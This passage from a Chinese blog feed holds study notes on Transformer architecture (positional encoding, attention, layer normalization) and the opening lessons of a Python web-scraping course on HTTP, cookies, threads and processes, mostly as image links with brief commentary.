representation中所演示的特点。因为我们让相似的单词(如泰迪和金巴)得到相同的输出(上下文)，那么神经网络就会将泰迪的输入3和金巴的输入3经过神经网络f(1)得到几乎相同的和 泰迪的输出y和金巴的输出y。(我的理解就是把泰迪和京巴放进了同一个上下文空间)</p><h2 id="位置编码"><a href="#位置编码" class="headerlink" title="位置编码"></a>位置编码</h2><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/7.png"></p><h3 id="RNN梯度消失的原因"><a href="#RNN梯度消失的原因" class="headerlink" title="RNN梯度消失的原因"></a>RNN梯度消失的原因</h3><p>是一个总的梯度和，他的梯度消失并不是变为0.而是说总梯度被近距离梯度主导，远距离梯度忽略不计</p><h3 id="为什么需要位置编码：Transformer并行化处理"><a href="#为什么需要位置编码：Transformer并行化处理" class="headerlink" title="为什么需要位置编码：Transformer并行化处理"></a>为什么需要位置编码：Transformer并行化处理</h3><p>加快了处理速度，但是忽略了单词之间的序列关系，所以需要位置编码</p><h3 id="怎么编码"><a href="#怎么编码" class="headerlink" title="怎么编码"></a>怎么编码</h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/8.png"></p><blockquote><p>奇数位置使用sin来编码，偶数位置使用cos来编码</p></blockquote><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/9.png"><br>相加得到transformer的输入</p><h2 id="注意力机制"><a href="#注意力机制" class="headerlink" title="注意力机制"></a>注意力机制</h2><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/10.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/11.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/12.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/13.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/14.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/15.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/16.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/17.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/18.png"></p><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/19.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/20.png"><br>使得梯度不易消失</p><h2 id="Batch-Normal"><a href="#Batch-Normal" class="headerlink" title="Batch Normal"></a>Batch Normal</h2><p>nlp中BN不大好使<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/21.png"></p><blockquote><p>BN是对batch中所有样本的每一行（即某个属性）做归一化</p></blockquote><p>BN优点<br>第一个就是可以解决内部协变量偏移 （？）<br>第二个优点就是缓解了梯度饱和问题（如果使用sigmoid激活函数的话)，加快收 敛。<br>BN的缺点<br>第一个， batch_size较小的时候，效果差。：因为BN是用一个batch的样本的均值方差去模拟总体，样本少了就模拟的不好<br>第二个缺点就是BN在RNN中效果比较差。这一点和第一点原因很类似，不过我单挑出来说。<br>RNN的输入是动态的：<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/22.png"><br>有10条句子，前9条有5个单词，第10条有20个单词<br>那么前5个单词的均值方差可以算出来，第10条后面的单词就成小batch了</p><h2 id="为什么使用layer-norm"><a href="#为什么使用layer-norm" class="headerlink" title="为什么使用layer-norm"></a>为什么使用layer-norm</h2><p>理解:为什么LayerNorm单独对一个样本的所有单词做缩放可以起到效果。<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/23.png"></p><blockquote><p>个人理解：每一句话中的所有字都是在同一个语义信息里的，所以可以LN</p></blockquote><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/24.png"><br>FF是两层全连接。然后再加上残差和构成前馈神经网络<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/25.png"></p><h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/26.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/27.png"><br>因为在预测的时候看不到后面的单词，所以需要mask掉</p><h3 id="多头注意力"><a href="#多头注意力" class="headerlink" title="多头注意力"></a>多头注意力</h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/28.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/29.png"><br>KV来自ENCODER<br>Q来自DECODER<br>​</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫入门</title>
      <link href="/2021/07/27/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/"/>
      <url>/2021/07/27/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="第01讲-必知必会，掌握HTTP基本原理"><a href="#第01讲-必知必会，掌握HTTP基本原理" class="headerlink" title="第01讲:必知必会，掌握HTTP基本原理"></a>第01讲:必知必会，掌握HTTP基本原理</h2><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><ul><li>URI(Uniform Resource ldentifier)即统一资源标志符</li><li>URL (Universal Resource Locator) 即统一资源定位符</li></ul><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/0.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/1.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/2.png"><br>一般都是只用URI，URL</p><h3 id="超文本-Hypertext"><a href="#超文本-Hypertext" class="headerlink" title="超文本 (Hypertext)"></a>超文本 (Hypertext)</h3><p>浏览器里看到的网页就是超文本解析而成的，其网页源代码是一系列HTML代码，里面包含了一系列标签<br>比如:  </p><ul><li>img显示图片</li><li>р指定显示段落等 </li></ul><p>浏览器解析这些标签后，便形成了我们平常看到的网页，而网页的源代码HTML就可以称作超文本</p><h3 id="协议类型"><a href="#协议类型" class="headerlink" title="协议类型"></a>协议类型</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/3.png"></p><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/4.png"></p><h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/5.png"></p><h5 id="越来越多的网站和App都已经向HTTPS-方向发展"><a href="#越来越多的网站和App都已经向HTTPS-方向发展" class="headerlink" title="越来越多的网站和App都已经向HTTPS 方向发展"></a>越来越多的网站和App都已经向HTTPS 方向发展</h5><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/6.png"></p><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/7.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/8.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/9.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/10.png"></p><h4 id="GET和POST请求方法有如下区别"><a href="#GET和POST请求方法有如下区别" class="headerlink" title="GET和POST请求方法有如下区别"></a>GET和POST请求方法有如下区别</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/11.png"></p><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/12.png"></p><h4 id="请求的网址"><a href="#请求的网址" class="headerlink" title="请求的网址"></a>请求的网址</h4><p>即统一资源定位符URL, 可以唯一确定我们想请求的资源</p><h4 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h4><p>用来说明服务器要使用的附加信息，比较重要的信息有 Cookie、 Referer、 User-Agent</p><h5 id="常用的请求头信息"><a href="#常用的请求头信息" class="headerlink" title="常用的请求头信息"></a>常用的请求头信息</h5><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/13.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/14.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/15.png"></p><h4 id="请求体"><a href="#请求体" class="headerlink" title="请求体"></a>请求体</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/16.png"><br>只有设置<img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/17.png">才会以表单形式提交<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/18.png"></p><h3 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/19.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/20.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/21.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/22.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/23.png"></p><h4 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/24.png"></p><h4 id="响应体"><a href="#响应体" class="headerlink" title="响应体"></a>响应体</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/25.png"></p><h2 id="第02讲-夯实根基，Web-网页基础"><a href="#第02讲-夯实根基，Web-网页基础" class="headerlink" title="第02讲:夯实根基，Web 网页基础"></a>第02讲:夯实根基，Web 网页基础</h2><h3 id="网页的组成"><a href="#网页的组成" class="headerlink" title="网页的组成"></a>网页的组成</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/26.png"></p><h4 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h4><p>是用来描述网页的一种语言 全称 Hyper Text Markup Language 超文本标记语言<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/27.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/28.png"></p><h4 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h4><p>CSS 全称叫作 Cascading Style Sheets, 即层叠样式表<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/29.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/30.png"></p><h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/31.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/32.png"></p><h4 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/33.png"></p><h3 id="网页的结构"><a href="#网页的结构" class="headerlink" title="网页的结构"></a>网页的结构</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/34.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/35.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/36.png"></p><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/37.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/38.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/39.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/40.png"></p><h4 id="怎样定位节点"><a href="#怎样定位节点" class="headerlink" title="怎样定位节点"></a>怎样定位节点</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/41.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/42.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/43.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/44.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/45.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/46.png"></p><h2 id="第03讲-原理探究，了解爬虫的基本原理"><a href="#第03讲-原理探究，了解爬虫的基本原理" class="headerlink" title="第03讲:原理探究，了解爬虫的基本原理"></a>第03讲:原理探究，了解爬虫的基本原理</h2><h3 id="爬虫定义"><a href="#爬虫定义" class="headerlink" title="爬虫定义"></a>爬虫定义</h3><p>爬虫就是获取网页并提取和保存信息的自动化程序</p><h3 id="爬虫怎么工作"><a href="#爬虫怎么工作" class="headerlink" title="爬虫怎么工作"></a>爬虫怎么工作</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/47.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/48.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/49.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/50.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/51.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/52.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/53.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/54.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/55.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/56.png"><br>对于这种情况<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/57.png"></p><h2 id="第04讲-基础探究，-Session-与-Cookies"><a href="#第04讲-基础探究，-Session-与-Cookies" class="headerlink" title="第04讲:基础探究， Session 与 Cookies"></a>第04讲:基础探究， Session 与 Cookies</h2><h3 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/58.png"><br>  但存在很大的缺陷：如可维护性差，不能根据URL灵活多变地显示内容等。<br>  因此，动态网页应运而生。它可以动态解析 URL中参数的变化，关联数据库并动态呈现不同的页面内容，非常灵活多变。<br>现在遇到的大多数网站都是动态网站，不再是一个简单的HTML 可能由 JSP、 PHP、Python等语言编写的，其功能比静态网页强大和丰富太多。动态网站还可以实现用户登录和注册的功能。</p><h3 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h3><p>  HTTP 特点之一 –无状态：是指HTTP协议对事务处理是没有记忆能力的，也就是说服务器不知道客户端是什么状态。<br>  意味着如果后续需要处理前面的信息，则必须重传 这也导致需要额外传递一些前面的重复请求，才能获取后续响应。</p><h3 id="Session和Cookies"><a href="#Session和Cookies" class="headerlink" title="Session和Cookies"></a>Session和Cookies</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/59.png"></p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/60.png"></p><h3 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h3><p>指某些网站为了辨别用户身份、进行Session跟踪而存储在用户本地终端上的数据</p><h3 id="Session和Cookies使用流程"><a href="#Session和Cookies使用流程" class="headerlink" title="Session和Cookies使用流程"></a>Session和Cookies使用流程</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/61.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/62.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/63.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/64.png"></p><h3 id="看看Cookies"><a href="#看看Cookies" class="headerlink" title="看看Cookies"></a>看看Cookies</h3><p>  每一行代表一个cookie，不可改名<br>  value：值为unicode字符需要用字符编码，如果是二进制数据需要用base64编码<br>  Max-age：该Cookie失效的时间，单位为秒，Max-age秒为正数，则该Cookie在Max-age秒后失效，如果为负数，则关闭浏览器时失效<br>  path：若设置path，则只有路径为path的网页可以访问该Cookie<br>  Domain：即可以访问该Cookie的域名<br>  Size：Cookie的大小<br>  HTTP：Cookie的http-only属性，若此属性为true，则只有在http-headers中会带有此Cookie的信息，而不能通过document.cookie来访问此Cookie<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/65.png"></p><h3 id="会话Cookie和持久Cookie"><a href="#会话Cookie和持久Cookie" class="headerlink" title="会话Cookie和持久Cookie"></a>会话Cookie和持久Cookie</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/66.png"></p><h3 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/67.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/68.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/69.png"></p><h2 id="第05讲-多路加速，了解多线程基本原理"><a href="#第05讲-多路加速，了解多线程基本原理" class="headerlink" title="第05讲:多路加速，了解多线程基本原理"></a>第05讲:多路加速，了解多线程基本原理</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>进程可以理解为是一个可以独立运行的程序单位<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/70.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/71.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/72.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/73.png"></p><h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/74.png"><br>注意：</p><ul><li>在单处理器和多处理器系统中都可以存在 仅靠一个核，就可以实现并发 </li><li>只能在多处理器系统中存在 如果计算机处理器只有一个核 就不可能实现并行</li></ul><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/75.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/76.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/77.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/78.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/79.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/80.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/81.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/82.png"></p><h4 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/83.png"><br>target传递方法名称，args传递方法的参数<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/84.png"><br>可以看到主线程没等子线程就结束了，所以要调用join方法<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/85.png"><br>将t2设置为守护线程，若主线程结束，则守护线程将被强制结束，当然如果调用了join方法则不会被强制退出<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/86.png"></p><h4 id="设置互斥锁"><a href="#设置互斥锁" class="headerlink" title="设置互斥锁"></a>设置互斥锁</h4><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/87.png"><br>将下图<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/88.png"><br>修改为<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/89.png"><br>即可完成加锁</p><h3 id="Python多线程的问题"><a href="#Python多线程的问题" class="headerlink" title="Python多线程的问题"></a>Python多线程的问题</h3><p> 一个进程中只有一个GIL，导致无法发挥多核并行优势<img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/90.png"></p><h2 id="第06讲-多路加速，了解多进程基本原理"><a href="#第06讲-多路加速，了解多进程基本原理" class="headerlink" title="第06讲:多路加速，了解多进程基本原理"></a>第06讲:多路加速，了解多进程基本原理</h2><h3 id="进程-1"><a href="#进程-1" class="headerlink" title="进程"></a>进程</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/91.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/92.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/93.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/94.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/95.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/96.png"></p><h3 id="多进程的实现"><a href="#多进程的实现" class="headerlink" title="多进程的实现"></a>多进程的实现</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/97.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/98.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/99.png"><br>注意：args后面跟的一定是<strong>元组</strong><br>调用start方法启动进程<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/100.png"><br>各个进程之间的数据是不会共享的<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/101.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/102.png"><br>来看一个实例：<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/103.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/104.png"></p><h3 id="其他创建进程的方式"><a href="#其他创建进程的方式" class="headerlink" title="其他创建进程的方式"></a>其他创建进程的方式</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/105.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/106.png"><br>进程的执行逻辑在run方法中实现<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/107.png"><br>三个进程分别打印出了2，3，4条结果</p><h3 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/108.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/109.png"><br>运行结果：<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/110.png"><br>因为主进程没有做任何事情。<br>这样我们可以防止无控制的生成子进程。<br>加上join方法就可以让子进程结束了主进程再结束。<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/111.png"><br>为了防止主进程无限等待，可以给join方法加一个超时参数，代表最长等待的秒数：<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/112.png"><br>代表最长等待1秒<br>​</p><h3 id="其他终止进程的方法"><a href="#其他终止进程的方法" class="headerlink" title="其他终止进程的方法"></a>其他终止进程的方法</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/113.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/114.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/115.png"><br>注意：调用terminate之后要调用join方法，才会终止（因为调用join会更新进程状态）</p><h3 id="进程互斥锁"><a href="#进程互斥锁" class="headerlink" title="进程互斥锁"></a>进程互斥锁</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/116.png"><br>不加锁的实例：<br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/117.png"><br><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/118.png"></p><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p><img src="http://106.12.125.218/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/119.png"><br><img 